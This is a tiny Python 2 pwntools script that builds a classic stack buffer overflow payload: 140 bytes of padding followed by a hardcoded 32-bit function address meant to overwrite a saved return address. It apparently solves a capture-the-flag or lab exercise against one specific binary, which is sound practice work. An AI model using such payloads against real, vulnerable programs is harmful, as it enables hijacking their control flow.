#!/usr/bin/env python
from pwn import *

size = 140
func_addr = p32(0x0804857e)

print 'A' * size + func_addr
